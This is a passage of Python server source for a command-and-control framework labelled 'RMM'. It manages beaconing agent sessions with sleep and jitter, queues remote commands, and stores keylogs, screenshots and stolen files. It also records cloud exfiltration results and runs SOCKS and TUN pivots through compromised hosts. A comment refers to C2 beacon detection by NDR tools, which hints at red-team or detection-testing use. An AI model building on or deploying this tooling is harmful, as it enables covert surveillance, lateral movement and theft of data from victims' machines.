        artifacts = self.purge_session_artifacts(session_id)
        try:
            shutil.rmtree(session_dir)
        except OSError as e:
            self.log(f"History delete failed for {session_id[:8]}: {e}", "WARNING")
            return False, None, "delete_failed", None
        self.remove_persisted_session(session_id)
        total = sum(artifacts.values())
        if total:
            self.log(
                f"Purged {total} artifact file(s) for session {session_id[:8]}: {artifacts}",
                "INFO",
            )
        return True, session_id, None, artifacts

    def clear_session_history(self) -> tuple[int, list[dict]]:
        """Delete all ended (non-active) archived sessions from disk."""
        to_delete: list[str] = []
        for meta in self.list_session_history():
            if meta.get("active"):
                continue
            sid = meta.get("session_id")
            if sid:
                to_delete.append(sid)
        deleted = 0
        errors: list[dict] = []
        for sid in to_delete:
            ok, session_id, err, _artifacts = self.delete_history_session(sid)
            if ok:
                deleted += 1
            else:
                errors.append({"session_id": session_id or sid, "error": err or "delete_failed"})
        return deleted, errors

    @staticmethod
    def _artifact_public_url(filepath):
        if not filepath:
            return None
        real = os.path.realpath(filepath)
        for kind in ("downloads", "screenshots"):
            base = os.path.realpath(os.path.join(LOG_DIR, kind))
            if real == base or real.startswith(base + os.sep):
                return f"{API_PREFIX}/artifacts/{kind}/{os.path.basename(real)}"
        return None

    def record_operator_action(self, session, command: str, action: str = "queued", detail: str | None = None):
        """Log operator commands for shared history (web UI, rmm_cli, API)."""
        if not session or not command:
            return
        suffix = f" [{detail}]" if detail else ""
        self._record_event(session, "operator", f"{action}: {command}{suffix}", command=command)

    def _broadcast_ephemeral_event(self, session_id: str, ev: dict) -> None:
        """WebSocket-only event (not stored in transcript or session history)."""
        ws_ev = _event_for_ws(ev)
        threading.Thread(
            target=self.event_hub.broadcast_event,
            args=(session_id, ws_ev),
            daemon=True,
        ).start()

    def _record_event(
        self,
        session,
        event_type,
        body,
        command=None,
        artifact=None,
        workspace_payload: dict | None = None,
    ):
        artifact_url = self._artifact_public_url(artifact) if artifact else None
        with self.session_lock:
            session._event_seq += 1
            ev = {
                "id": session._event_seq,
                "timestamp": datetime.now().isoformat(),
                "type": event_type,
                "body": body,
                "command": command,
                "artifact": artifact,
                "artifact_url": artifact_url,
            }
            if workspace_payload is not None:
                try:
                    payload_size = len(json.dumps(workspace_payload, ensure_ascii=False).encode())
                except (TypeError, ValueError):
                    payload_size = MAX_WORKSPACE_PAYLOAD_BYTES + 1
                if payload_size <= MAX_WORKSPACE_PAYLOAD_BYTES:
                    ev["workspace_payload"] = workspace_payload
                else:
                    self.log(
                        f"Workspace event payload dropped: session={session.id[:8]} "
                        f"type={event_type} bytes={payload_size}",
                        "WARNING",
                    )
            session.result_events.append(ev)
        self._history_append_event(session, ev)
        self._history_write_meta(session)
        self.workspace_publish_event(session, ev)
        ws_ev = _event_for_ws(ev)
        threading.Thread(
            target=self.event_hub.broadcast_event,
            args=(session.id, ws_ev),
            daemon=True,
        ).start()
        with session.wait_lock:
            if session.wait_event is not None:
                session.wait_result = ev
                session.wait_event.set()

    def _publish_workspace_chunk(self, session, payload: dict) -> None:
        """Publish a non-transcript artifact chunk to the local workspace."""
        if self.storage_mode != "workspace" or not getattr(session, "workspace_id", None):
            return
        try:
            payload_size = len(json.dumps(payload, ensure_ascii=False).encode())
        except (TypeError, ValueError):
            payload_size = MAX_WORKSPACE_PAYLOAD_BYTES + 1
        if payload_size > MAX_WORKSPACE_PAYLOAD_BYTES:
            self.log(
                f"Workspace chunk dropped: session={session.id[:8]} bytes={payload_size}",
                "WARNING",
            )
            return
        self.workspace_publish_event(
            session,
            {
                "id": 0,
                "timestamp": datetime.now().isoformat(),
                "type": "file_upload_chunk",
                "body": "",
                "command": None,
                "artifact": None,
                "artifact_url": None,
                "workspace_payload": payload,
            },
        )

    def sessions_to_json(self, workspace_id: str | None = None):
        with self.session_lock:
            return [
                s.to_dict()
                for s in self.sessions.values()
                if workspace_id is None or s.workspace_id == workspace_id
            ]

    def _broadcast_sessions_async(self) -> None:
        """Push session list to operator WS clients without blocking beacon handlers."""
        def fire() -> None:
            with self._sessions_broadcast_lock:
                self._sessions_broadcast_timer = None
            sessions = self.sessions_to_json()
            self.event_hub.broadcast_sessions(sessions)

        with self._sessions_broadcast_lock:
            if self._sessions_broadcast_timer is not None:
                self._sessions_broadcast_timer.cancel()
            self._sessions_broadcast_timer = threading.Timer(0.2, fire)
            self._sessions_broadcast_timer.daemon = True
            self._sessions_broadcast_timer.start()

    def kill_session(self, session_id_or_prefix):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return False, "not_found"
        self._finalize_session_history(session, reason="killed")
        self.clear_ai_chat(session.id)
        with self.session_lock:
            self.killed_sessions.add(session.id)
            if session.id in self.sessions:
                del self.sessions[session.id]
            if self.current_session == session.id:
                self.current_session = None
        self.remove_persisted_session(session.id)
        self.event_hub.broadcast_sessions(self.sessions_to_json())
        if self.storage_mode == "workspace":
            self.tun_transport.stop(session.id)
            getattr(self, "workspace_tun_configs", {}).pop(session.id, None)
        else:
            self.tun.stop(session.id)
        self.socks.stop(session.id)
        getattr(self, "workspace_socks_configs", {}).pop(session.id, None)
        return True, session.id

    def start_socks(self, session_id: str, port: int = DEFAULT_SOCKS_PORT, bind_host: str = DEFAULT_BIND_HOST) -> bool:
        session = self.get_session(session_id)
        if not session:
            return False
        plugin_error = self.pivot_plugin_error(session)
        if plugin_error:
            self.log(f"SOCKS pivot unavailable for {session.id[:8]}: {plugin_error}", "ERROR")
            return False
        try:
            if self.storage_mode == "workspace":
                self.socks.start_external(session_id, port=port, bind_host=bind_host)
                getattr(self, "workspace_socks_configs", {})[session_id] = {
                    "session_id": session_id,
                    "bind_host": bind_host,
                    "port": port,
                    "socks_url": f"socks5://{bind_host}:{port}",
                    "workspace_local": True,
                }
            else:
                self.socks.start(session_id, port=port, bind_host=bind_host)
        except OSError as e:
            self.log(f"SOCKS failed to bind {bind_host}:{port}: {e}", "ERROR")
            return False
        self.record_operator_action(session, f"socks {port}", "socks")
        self._record_event(
            session,
            "output",
            f"SOCKS5 listening on {bind_host}:{port} (socks5://{bind_host}:{port})",
            command=f"socks {port}",
        )
        return True

    def pivot_plugin_error(self, session) -> str | None:
        """Return a clear readiness error for the session's SOCKS plugin."""
        agent_type = str(getattr(session, "agent_type", "")).lower()
        capabilities = {str(item).lower() for item in getattr(session, "capabilities", [])}
        if agent_type == "go":
            if "socks-plugin" not in capabilities:
                return "the Go agent does not advertise socks-plugin support"
            plugin_path = plugin_path_for_session(GO_SOCKS_PLUGIN_FILE, getattr(session, "id", None))
            if not plugin_path:
                return (
                    "install socks.dll from the external plugin bundle into "
                    "RMM_PLUGINS_DIR"
                )
        elif agent_type == "powershell" and not plugin_path_for_session(
            "socks.ps1", getattr(session, "id", None)
        ):
            return "the deployed PowerShell SOCKS plugin is missing from RMM_PLUGINS_DIR"
        elif agent_type != "powershell":
            return f"no SOCKS pivot plugin is available for agent type {agent_type or 'unknown'}"
        return None

    def stop_socks(self, session_id: str) -> bool:
        stopped = self.socks.stop(session_id)
        getattr(self, "workspace_socks_configs", {}).pop(session_id, None)
        session = self.get_session(session_id)
        if session:
            self.record_operator_action(session, "socks stop", "socks")
            if stopped:
                self._record_event(session, "output", "SOCKS relay stopped", command="socks stop")
        return stopped

    def socks_active(self, session_id: str) -> bool:
        return self.socks.get(session_id) is not None

    def list_socks_status(self) -> list[dict]:
        """Return public SOCKS relays with session identity when known."""
        if self.storage_mode == "workspace":
            relays = [dict(row) for row in getattr(self, "workspace_socks_configs", {}).values()]
        else:
            relays = self.socks.list_relays()
        rows = []
        for relay in relays:
            row = dict(relay)
            session = self.get_session(relay["session_id"])
            if session:
                row["hostname"] = session.hostname
                row["username"] = session.username
                row["beacon_status"] = session.beacon_status()
            else:
                row["hostname"] = None
                row["username"] = None
                row["beacon_status"] = None
            rows.append(row)
        return rows

    def tun_plugin_error(self, session) -> str | None:
        """Return a readiness error for the RMM-owned TUN pivot."""
        agent_type = str(getattr(session, "agent_type", "")).lower()
        capabilities = {str(item).lower() for item in getattr(session, "capabilities", [])}
        if agent_type != "go":
            return f"the TUN pivot currently requires a Go agent, got {agent_type or 'unknown'}"
        if "tun-plugin" not in capabilities:
            return "the Go agent does not advertise tun-plugin support"
        if not plugin_path_for_session(GO_TUN_PLUGIN_FILE, getattr(session, "id", None)):
            return "install tun.dll from the external plugin bundle into RMM_PLUGINS_DIR"
        if self.storage_mode != "workspace" and (not os.path.isfile(TUN_HELPER) or not os.access(TUN_HELPER, os.X_OK)):
            return f"build the server TUN helper first (make tun-build; expected {TUN_HELPER})"
        return None

    def start_tun(self, session_id: str, config: dict) -> dict:
        """Start the RMM-owned TUN frontend for one Go session."""
        session = self.get_session(session_id)
        if not session:
            raise TunError("session not found")
        plugin_error = self.tun_plugin_error(session)
        if plugin_error:
            raise TunError(plugin_error)
        normalized = normalize_tun_config(config)
        if self.storage_mode == "workspace":
            self.tun_transport.start_external(
                session.id,
                port=0,
                bind_host="127.0.0.1",
                udp_idle_timeout=normalized["udp_timeout_seconds"],
            )
            getattr(self, "workspace_tun_configs", {})[session.id] = dict(normalized)
            status = dict(normalized)
            status.update(
                {
                    "session_id": session.id,
                    "helper_alive": False,
                    "workspace_local": True,
                }
            )
        else:
            relay = self.tun.start(session.id, normalized)
            status = relay.status()
        self.record_operator_action(session, f"tun start {normalized['device_name']}", "tun")
        self._record_event(
            session,
            "output",
            f"RMM TUN relay enabled on {normalized['device_name']}",
            command=f"tun start {normalized['device_name']}",
        )
        return status

    def stop_tun(self, session_id: str) -> bool:
        """Disable the server-side TUN frontend for one session."""
        if self.storage_mode == "workspace":
            stopped = self.tun_transport.stop(session_id)
            getattr(self, "workspace_tun_configs", {}).pop(session_id, None)
        else:
            stopped = self.tun.stop(session_id)
        session = self.get_session(session_id)
        if session:
            self.record_operator_action(session, "tun stop", "tun")
            if stopped:
                self._record_event(session, "output", "RMM TUN relay stopped", command="tun stop")
        return stopped

    def tun_active(self, session_id: str) -> bool:
        """Return whether a server-side TUN relay exists for a session."""
        if self.storage_mode == "workspace":
            return session_id in getattr(self, "workspace_tun_configs", {})
        return self.tun.get(session_id) is not None

    def tun_config(self, session_id: str) -> dict | None:
        """Return the safe operator configuration for a session relay."""
        if self.storage_mode == "workspace":
            config = getattr(self, "workspace_tun_configs", {}).get(session_id)
            if not config:
                return None
            status = dict(config)
            status.update({"session_id": session_id, "helper_alive": False, "workspace_local": True})
            return status
        relay = self.tun.get(session_id)
        return relay.status() if relay else None

    def list_tun_status(self) -> list[dict]:
        """Return active TUN relays with session identity and beacon status."""
        if self.storage_mode == "workspace":
            active = []
            for session_id, config in getattr(self, "workspace_tun_configs", {}).items():
                row = dict(config)
                row.update({"session_id": session_id, "helper_alive": False, "workspace_local": True})
                active.append(row)
        else:
            active = self.tun.list_status()
        rows = []
        for row in active:
            session_id = row["session_id"]
            session = self.get_session(session_id)
            if session:
                row["hostname"] = session.hostname
                row["username"] = session.username
                row["beacon_status"] = session.beacon_status()
            else:
                row["hostname"] = None
                row["username"] = None
                row["beacon_status"] = None
            rows.append(row)
        return rows

    def exec_and_wait(self, session_id_or_prefix, command, timeout=120):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None, "not_found"
        event = threading.Event()
        with session.wait_lock:
            session.wait_event = event
            session.wait_result = None
        if not self.set_command(session.id, command, "oneshot"):
            with session.wait_lock:
                session.wait_event = None
            return None, "not_found"
        if not event.wait(timeout):
            with session.wait_lock:
                session.wait_event = None
            return None, "timeout"
        with session.wait_lock:
            result = session.wait_result
            session.wait_event = None
            session.wait_result = None
        return result, "ok"

    def get_events(self, session_id_or_prefix, since_id=0, limit=50):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None
        with self.session_lock:
            events = [e for e in session.result_events if e["id"] > since_id]
        if limit > 0:
            events = events[-limit:]
        return events
    
    def register_session(
        self,
        session_id,
        hostname,
        username,
        ip=None,
        sleep_seconds=None,
        jitter_percent=None,
        sync_client_config=False,
        agent_type="powershell",
        capabilities=None,
    ):
        to_save = None
        is_new = False
        with self.session_lock:
            if session_id in self.killed_sessions:
                return None
            persisted = self._persisted_session_configs.get(session_id)
            if not persisted:
                persisted = self._persisted_config_from_history_meta(session_id)
            if session_id not in self.sessions:
                session = Session(session_id, hostname, username, ip)
                session.agent_type = (agent_type or "powershell").strip().lower()
                session.capabilities = sorted(set(capabilities or []))
                persisted_record = self._persisted_session_records.get(session_id, {})
                persisted_workspace = str(persisted_record.get("workspace_id") or "").strip()
                if valid_workspace_id(persisted_workspace):
                    session.workspace_id = persisted_workspace
                if persisted:
                    session.sleep_seconds = persisted["sleep_seconds"]
                    session.jitter_percent = persisted["jitter_percent"]
                    session.config_synced = True
                elif sync_client_config:
                    if sleep_seconds is not None:
                        session.sleep_seconds = max(1, min(3600, int(sleep_seconds)))
                    if jitter_percent is not None:
                        session.jitter_percent = max(0, min(100, int(jitter_percent)))
                    session.config_synced = True
                self.sessions[session_id] = session
                to_save = session
                is_new = True
            else:
                s = self.sessions[session_id]
                s.last_seen = datetime.now()
                s.hostname = hostname
                s.username = username
                if ip is not None:
                    s.ip = ip
                s.agent_type = (agent_type or s.agent_type or "powershell").strip().lower()
                s.capabilities = sorted(set(capabilities or s.capabilities or []))
                if sync_client_config and not persisted and not s.config_synced:
                    if sleep_seconds is not None:
                        s.sleep_seconds = max(1, min(3600, int(sleep_seconds)))
                    if jitter_percent is not None:
                        s.jitter_percent = max(0, min(100, int(jitter_percent)))
                    s.config_synced = True
                    to_save = s
                else:
                    to_save = None
        if is_new and to_save is not None:
            self.backfill_download_artifacts(to_save)
            self._apply_history_meta_to_session(to_save)
            restored = self._rehydrate_session_events_from_history(to_save)
            if restored:
                self.log(
                    f"Restored {restored} event(s) from history for {to_save.id[:8]}",
                    "INFO",
                )
            self._history_write_meta(to_save)
        if to_save is not None:
            self.save_session(to_save)
        if is_new:
            self.log(f"New session: {to_save}", "SUCCESS")
        self._broadcast_sessions_async()
        return is_new
    
    def update_session_config(self, session_id, sleep_seconds=None, jitter_percent=None):
        session = self.get_session(session_id)
        if session:
            with self.session_lock:
                if sleep_seconds is not None:
                    session.sleep_seconds = max(1, min(3600, sleep_seconds))
                if jitter_percent is not None:
                    session.jitter_percent = max(0, min(100, jitter_percent))
                session.config_synced = True
                session.config_pending = True
            self.save_session(session)
            return True
        return False
    
    def list_sessions(self):
        with self.session_lock:
            if not self.sessions:
                self.tty_print(f"{Colors.YELLOW}No active sessions{Colors.END}")
                return

            self.tty_print(f"\n{Colors.BOLD}Active Sessions:{Colors.END}")
            self.tty_print(
                f"{'ID':<10} {'User':<15} {'Hostname':<20} {'Sleep':<8} {'Jitter':<8} "
                f"{'Last seen':<12} {'Status':<8}",
                ansi=False,
            )
            self.tty_print("-" * 95, ansi=False)
            for sid, session in self.sessions.items():
                ago = int((datetime.now() - session.last_seen).total_seconds())
                status = session.beacon_status()
                self.tty_print(
                    f"{sid[:8]:<10} {session.username:<15} {session.hostname:<20} "
                    f"{session.sleep_seconds:<8} {session.jitter_percent:<8}% "
                    f"{self._format_ago(ago):<12} {status:<8}",
                    ansi=False,
                )
            self.tty_print("", ansi=False)
    
    def set_command(self, session_id, command, cmd_type="oneshot"):
        session = self.get_session(session_id)
        if not session:
            return False
        plugin_meta = plugin_command_metadata(command, session.agent_type)
        with self.session_lock:
            if command == "__STOP__":
                session.persistent_cmd = None
                return True
            if cmd_type == "persistent":
                session.cmd_queue.clear()
                session.persistent_cmd = command
            else:
                session.cmd_queue.append(command)
        if plugin_meta:
            command_label = (
                f" command={plugin_meta['command']}"
                if plugin_meta.get("command")
                else ""
            )
            self.log(
                f"Plugin queued: session={session.id[:8]} plugin={plugin_meta['plugin']} "
                f"export={plugin_meta['export']}{command_label} mode={cmd_type}",
                "CMD",
            )
        return True
    
    def get_command(self, session_id):
        """Return (command_string, response_type) for JSON /cmd responses.
        response_type: none | config | execute | persistent
        One-shot commands are queued (FIFO). Persistent runs until __STOP__.
        """
        with self.session_lock:
            if session_id in self.killed_sessions:
                return ("__EXIT__", "execute")
        session = self.get_session(session_id)
        if not session:
            return ("", "none")
        self.touch_session(session_id)
        dispatch_log = None
        with self.session_lock:
            if session.persistent_cmd is not None:
                cmd = session.persistent_cmd
                response = (cmd, "persistent")
            elif session.cmd_queue:
                cmd = session.cmd_queue.popleft()
                response = (cmd, "execute")
            elif session.config_pending:
                session.config_pending = False
                config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
                response = (config_cmd, "config")
            else:
                # Idle: no commands and no pending config update.
                # Do NOT push __CONFIG__ here — the agent keeps its own sleep/jitter defaults
                # until the operator explicitly changes them via PATCH (sets config_pending=True).
                # Pushing config on every empty beacon caused the agent to inherit a persisted
                # 60-second sleep_seconds, breaking 5-second C2 beacon detection in NDR tools.
                response = ("", "none")
            plugin_meta = plugin_command_metadata(response[0])
            if plugin_meta and response[1] in ("execute", "persistent"):
                plugin_meta["started_at"] = time.monotonic()
                session.pending_plugin_runs.append(plugin_meta)
                command_label = (
                    f" command={plugin_meta['command']}"
                    if plugin_meta.get("command")
                    else ""
                )
                dispatch_log = (
                    f"Plugin dispatched: session={session.id[:8]} plugin={plugin_meta['plugin']} "
                    f"export={plugin_meta['export']}{command_label}"
                )
        if dispatch_log:
            self.log(dispatch_log, "INFO")
        return response

    @staticmethod
    def _unwrap_rmm_result_text(body: str) -> tuple:
        """If client sent JSON {rmm_cmd, rmm_output}, return (text, cmd_echo); else (body, None)."""
        if not body or not body.lstrip().startswith("{"):
            return (body, None)
        try:
            d = json.loads(body)
        except json.JSONDecodeError:
            return (body, None)
        if isinstance(d, dict) and "rmm_output" in d:
            out = d.get("rmm_output", "")
            if out is None:
                out = ""
            elif not isinstance(out, str):
                out = str(out)
            cmd_echo = d.get("rmm_cmd")
            if cmd_echo is not None and not isinstance(cmd_echo, str):
                cmd_echo = str(cmd_echo)
            return (out, cmd_echo)
        return (body, None)

    def _save_file_upload(self, session, data: dict, timestamp: str) -> str | None:
        """Write agent file_upload payload. Returns final path when complete, else None (chunk)."""
        raw_name = data.get("filename", f"unknown_{timestamp}")
        filename = safe_storage_filename(raw_name, f"unknown_{timestamp}")
        downloads_dir = os.path.join(LOG_DIR, "downloads")
        prefix = safe_session_storage_prefix(session.id)
        final_path = safe_join_under(downloads_dir, f"{prefix}_{filename}")
        content = base64.b64decode(data.get("content", "") or "")

        if "offset" not in data:
            with open(final_path, "wb") as f:
                f.write(content)
            return final_path

        upload_id = re.sub(r"[^\w-]", "", str(data.get("upload_id") or "default"))[:64] or "default"
        staging_path = safe_join_under(downloads_dir, f"{prefix}_{upload_id}.part")
        offset = int(data.get("offset", 0))
        mode = "wb" if offset == 0 else "ab"
        with open(staging_path, mode) as f:
            f.write(content)
        if not data.get("eof"):
            return None
        os.replace(staging_path, final_path)
        return final_path

    def handle_result(self, session_id, result, cmd_type="output"):
        session = self.get_session(session_id)
        if not session:
            return
        self.touch_session(session_id)
        with self.session_lock:
            plugin_meta = (
                session.pending_plugin_runs.popleft()
                if session.pending_plugin_runs
                else None
            )

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        tty_lines = []
        artifact = None
        event_body = result
        echoed_cmd = None
        plugin_result_failed = False
        workspace_payload = None

        if cmd_type == "file_upload":
            try:
                data = json.loads(result)
                remote_path = (data.get("remote_path") or "").strip()
                if not remote_path:
                    if self.storage_mode == "workspace" and "offset" in data and not data.get("eof"):
                        with self.session_lock:
                            remote_path = (
                                session.pending_downloads[0]
                                if session.pending_downloads
                                else os.path.basename(str(data.get("filename") or "unknown"))
                            )
                    else:
                        remote_path = self.pop_pending_download_path(
                            session, data.get("filename", "")
                        )
                if self.storage_mode == "workspace":
                    workspace_payload = {
                        "kind": "file_upload",
                        "data": data,
                        "remote_path": remote_path,
                    }
                    if "offset" in data and not data.get("eof"):
                        self._publish_workspace_chunk(session, workspace_payload)
                        return
                    filename = safe_storage_filename(
                        data.get("filename", f"unknown_{timestamp}"),
                        f"unknown_{timestamp}",
                    )
                    event_body = f"{remote_path} → {filename}"
                else:
                    filepath = self._save_file_upload(session, data, timestamp)
                    if not filepath:
                        return
                    self.register_download_artifact(session, filepath, remote_path)
                    artifact = filepath
                    event_body = f"{remote_path} → {os.path.basename(filepath)}"
                echoed_cmd = f"download {remote_path}"
                tty_lines.append(("log", f"File downloaded: {remote_path}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Download error: {e}", "ERROR"))

        elif cmd_type == "screenshot":
            try:
                if self.storage_mode == "workspace":
                    filename = f"{safe_session_storage_prefix(session.id)}_{timestamp}.png"
                    workspace_payload = {
                        "kind": "screenshot",
                        "filename": filename,
                        "content_b64": result,
                    }
                    event_body = f"Screenshot captured: {filename}"
                else:
                    content = base64.b64decode(result)
                    filepath = safe_join_under(
                        LOG_DIR,
                        "screenshots",
                        f"{safe_session_storage_prefix(session.id)}_{timestamp}.png",
                    )
                    with open(filepath, 'wb') as f:
                        f.write(content)
                    artifact = filepath
                    event_body = filepath
                echoed_cmd = "screenshot"
                tty_lines.append(("log", f"Screenshot captured for {session.id[:8]}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Screenshot error: {e}", "ERROR"))
                plugin_result_failed = True

        elif cmd_type == "keylog":
            try:
                if self.storage_mode == "workspace":
                    filename = f"{safe_session_storage_prefix(session.id)}_{timestamp}.log"
                    workspace_payload = {
                        "kind": "keylog",
                        "filename": filename,
                        "content": result,
                    }
                else:
                    filepath = safe_join_under(
                        LOG_DIR,
                        "keylogs",
                        f"{safe_session_storage_prefix(session.id)}_{timestamp}.log",
                    )
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(result)
                    artifact = filepath
                event_body = result[:2000] if len(result) > 2000 else result
                tty_lines.append(("log", f"Keylog captured for {session.id[:8]}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Keylog save error: {e}", "ERROR"))

        elif cmd_type == "config_ack":
            event_body = result
            tty_lines.append(("log", f"Session {session.id[:8]} acknowledged config update", "SUCCESS"))

        elif cmd_type == "cloud_upload":
            try:
                data = json.loads(result)
                remote_path = (data.get("remote_path") or "").strip()
                profile = (data.get("profile") or "").strip()
                echoed_cmd = f"exfil {remote_path}" + (f" --profile {profile}" if profile else "")
                if data.get("success"):
                    link = (data.get("link") or "").strip()
                    dest = (data.get("dest") or "").strip()
                    backend = (data.get("backend") or "").strip()
                    label = backend or profile or "cloud"
                    if link:
                        event_body = f"{remote_path} → {link}"
                    elif dest:
                        event_body = f"{remote_path} → {label}:{dest}"
                    else:
                        event_body = remote_path
                    tty_lines.append(("log", f"Exfil ({label}): {link or dest or remote_path}", "SUCCESS"))
                else:
                    err = data.get("error") or "Exfil failed"
                    event_body = f"{remote_path}: {err}" if remote_path else str(err)
                    tty_lines.append(("log", f"Exfil failed: {err}", "ERROR"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Exfil result error: {e}", "ERROR"))

        elif cmd_type in ("exfil_progress", "download_progress"):
            try:
                data = json.loads(result)
                remote_path = (data.get("remote_path") or "").strip()
                if cmd_type == "exfil_progress":
                    profile = (data.get("profile") or "").strip()
                    echoed_cmd = f"exfil {remote_path}" + (f" --profile {profile}" if profile else "")
                else:
                    echoed_cmd = f"download {remote_path}" if remote_path else None
                self._broadcast_ephemeral_event(
                    session.id,
                    {
                        "timestamp": datetime.now().isoformat(),
                        "type": cmd_type,
                        "body": json.dumps(data, ensure_ascii=False),
                        "command": echoed_cmd,
                        "artifact": None,
                        "artifact_url": None,
                    },
                )
            except Exception as e:
                self.log(f"{cmd_type} error: {e}", "WARNING")
            return

        else:
            text, echoed_cmd = self._unwrap_rmm_result_text(result)
            event_body = text
            if result.startswith(("Plugin failed:", "Screenshot failed:")):
                plugin_result_failed = True
            line = f"\n{Colors.DIM}[Result from {session}]"
            if echoed_cmd:
                line += f" » {echoed_cmd}"
            line += f"{Colors.END}"
            tty_lines.append(("result", line, text))

        if plugin_meta:
            elapsed_ms = max(
                0,
                int((time.monotonic() - plugin_meta["started_at"]) * 1000),
            )
            status = "failed" if plugin_result_failed else "completed"
            level = "ERROR" if plugin_result_failed else "SUCCESS"
            command_label = (
                f" command={plugin_meta['command']}"
                if plugin_meta.get("command")
                else ""
            )
            self.log(
                f"Plugin {status}: session={session.id[:8]} plugin={plugin_meta['plugin']} "
                f"export={plugin_meta['export']}{command_label} result_type={cmd_type} "
                f"output_bytes={len(result)} elapsed_ms={elapsed_ms}",
                level,
            )

        self._record_event(
            session,
            cmd_type,
            event_body,
            command=echoed_cmd,
            artifact=artifact,
            workspace_payload=workspace_payload,
        )

        with self.tty_lock:
            for kind, *rest in tty_lines:
                if kind == "log":
                    self.log(rest[0], rest[1])
                elif kind == "result":
                    self.tty_print(rest[0])
                    self.tty_print(rest[1], ansi=False)
                    self.tty_print(f"{Colors.DIM}{'='*60}{Colors.END}")
            sys.stdout.flush()
            if not self._cli_use_ptk:
                try:
                    readline.redisplay()
                except Exception:
                    pass

def _resolve_api_session(handler, session_ref: str):
    """Resolve a handler session while keeping lightweight test doubles compatible."""
    resolver = getattr(handler, "_api_session", None)
    if resolver is not None:
        return resolver(session_ref)
    server = getattr(handler, "server_instance", None)
    return server.resolve_session(session_ref) if server is not None else None


class RMMHandler(BaseHTTPRequestHandler):
    server_instance = None
    listener_role = "combined"
    
    def log_message(self, format, *args):
        pass

    def _listener_role(self) -> str:
        """Return the role of the listener that accepted this request."""
        return str(getattr(self, "listener_role", "") or getattr(getattr(self, "server", None), "listener_role", "combined"))

    def _path_allowed(self, path: str, *, method: str = "GET") -> bool:
        """Keep administration and beacon routes off each other's listeners."""
        role = self._listener_role()
        if role == "combined":
            return True
        is_api = path.startswith(API_PREFIX)
        is_web = path == "/" or path.startswith("/ui")
        is_beacon = path in {
            "/register",
            "/cmd",
            "/ping",
            "/result",
            "/socks",
            "/socks-ws",
            "/tun",
        } or path == "/tools/rclone.exe" or path.startswith("/tools/plugins/")
        if role == "admin":
            return is_api or is_web
        if role == "beacon":
            return is_beacon
        return False

    def handle(self):
        """Suppress BrokenPipe when clients close before reading the response."""
        try:
            super().handle()
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _safe_write(self, data: bytes) -> None:
        try:
            self.wfile.write(data)
        except (BrokenPipeError, ConnectionResetError):
            pass
    
    def _respond(self, code, body="", content_type="text/plain"):
        try:
            payload = body.encode() if isinstance(body, str) else body
            if payload is None:
                payload = b""
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            # Do NOT send Content-Length here.  With a TLS tunnel (e.g. Cloudflare),
            # the server sends a TLS close_notify alert after the FIN.  If the client
            # has already stopped reading at exactly Content-Length bytes, those alert
            # bytes sit in the TCP receive buffer.  Socket.Close() with unread receive-
            # buffer data sends RST instead of FIN.  Without Content-Length the client's
            # ReadToEnd() reads until TLS EOF (the close_notify IS the EOF signal), the
            # buffer is empty, and the client closes gracefully with FIN.
            self.send_header("Connection", "close")
            self.end_headers()
            if payload:
                self._safe_write(payload)
            self.close_connection = True
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _json(self, code, payload):
        self._respond(code, json.dumps(payload), "application/json")

    def _read_body_bytes(self):
        length = int(self.headers.get("Content-Length", 0))
        if length > MAX_BODY_BYTES:
            raise ValueError("body_too_large")
        if length <= 0:
            return b""
        return self.rfile.read(length)

    def _read_json_body(self):
        raw = self._read_body_bytes().decode(errors="replace")
        if not raw.strip():
            return {}
        return json.loads(raw)

    def _api_token_from_request(self, qs=None):
        auth = self.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:].strip()
        header = self.headers.get("X-RMM-Token", "").strip()
        if header:
            return header
        if qs:
            return qs.get("token", [""])[0].strip()
        return ""

    def _api_authorized(self, qs=None):
        self._workspace_scope_id = None
        if INSECURE and not API_TOKEN:
            return True
        if API_TOKEN and secure_compare(self._api_token_from_request(qs), API_TOKEN):
            return True
        server = getattr(self, "server_instance", None)
        registry = getattr(server, "workspace_registry", None)
        if registry is None:
            return False
        workspace_id = self.headers.get("X-RMM-Workspace", "").strip()
        workspace_token = self.headers.get("X-RMM-Workspace-Token", "").strip()
        if registry.authenticate(workspace_id, workspace_token):
            self._workspace_scope_id = workspace_id
            return True
        return False

    def _workspace_scope(self) -> str | None:
        """Return the workspace scope established by the current API auth check."""
        return getattr(self, "_workspace_scope_id", None)

    def _api_session(self, session_ref: str):
        """Resolve a session while enforcing workspace ownership when scoped."""
        server = self.server_instance
        workspace_id = self._workspace_scope()
        if workspace_id:
            resolver = getattr(server, "resolve_workspace_session", None)
            if resolver:
                return resolver(workspace_id, session_ref)
            session = server.resolve_session(session_ref)
            return session if getattr(session, "workspace_id", None) == workspace_id else None
        return server.resolve_session(session_ref)

    def _api_unauthorized(self):
        self._json(401, {"error": "unauthorized", "detail": "Valid RMM_API_TOKEN required (Bearer or X-RMM-Token)"})

    def _handle_websocket_upgrade(self, qs):
        if self.headers.get("Upgrade", "").lower() != "websocket":
            self._respond(400, "Expected WebSocket upgrade")
            return True
        if not self._api_authorized(qs):
            self._respond(401, "Unauthorized")
            return True

        ws = WebSocketConnection.from_http_request(
            self.connection,
            {k: self.headers[k] for k in self.headers},
            self.path,
        )
        if not ws:
            self._respond(400, "WebSocket handshake failed")
            return True

        session_filter = qs.get("session", [None])[0]
        hub = self.server_instance.event_hub
        hub.add(ws, session_filter)
        self.close_connection = False

        try:
            sessions = self.server_instance.sessions_to_json()
            ws.send_json({"op": "sessions", "sessions": sessions})
            while self.server_instance.running and not ws.closed:
                msg = ws.recv_json()
                if msg is None:
                    break
                if msg.get("op") == "_timeout":
                    ws.send_json({"op": "ping"})
                    continue
                if msg.get("op") == "subscribe":
